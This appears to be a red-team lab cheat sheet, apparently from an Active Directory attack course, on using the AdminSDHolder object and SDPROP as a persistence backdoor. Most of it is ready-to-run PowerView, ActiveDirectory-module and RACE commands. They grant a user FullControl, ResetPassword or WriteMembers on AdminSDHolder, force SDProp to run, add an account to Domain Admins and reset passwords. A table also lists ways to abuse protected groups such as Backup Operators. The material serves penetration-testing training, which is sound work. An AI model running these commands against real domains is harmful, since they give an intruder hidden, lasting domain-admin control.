# AdminSDHolder using ACLs 

Tags: #AD #Windows #Powershell 

```bash 
- Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups ( called Protected Groups).

- Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.
```

Protected Group:

| Account Operators | Enterprise Admins            |
| ----------------- | ---------------------------- |
| Backup Operators  | Domain Controllers           |
| Server Operators  | Read-only Domain Controllers |
| Print Operators   | Schema Admins                |
| Domain Admins     | Administrators               |
| Replicator        |                              |
Well known abuse of some of the Protected Groups - All of the below can log on locally to DC:

| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within these groups.          |
| ----------------- | ------------------------------------------------------------------------------------ |
| Backup Operators  | Backup GPO, edit to add SID of controlled account to a privileged group and Restore. |
| Server Operators  | Run a command as system (using the disabled Browser service)                         |
| Print Operators   | Copy ntds.dit backup, load device drivers.                                           |

```bash 
- With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.

- In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.
```

## Comandos 

```powershell 
# Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
❯ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose    


# Using ActiveDirectory Module and RACE toolkit (https://github.com/samratashok/RACE):
❯ Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose


# Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder,:
❯ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

❯ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

```powershell 
# Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory:
❯ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

# For pre-Server 2008 machines:
❯ Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

```powershell 
# Check the Domain Admins permission - PowerView as normal user:
❯ Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}

# Using ActiveDirectory Module:
❯ (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}
```

```powershell 
# Abusing FullControl using PowerView:
❯ Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose

# Using ActiveDirectory Module:
❯ Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

```powershell 
# Abusing ResetPassword using PowerView:
❯ Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose

# Using ActiveDirectory Module:
❯ Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```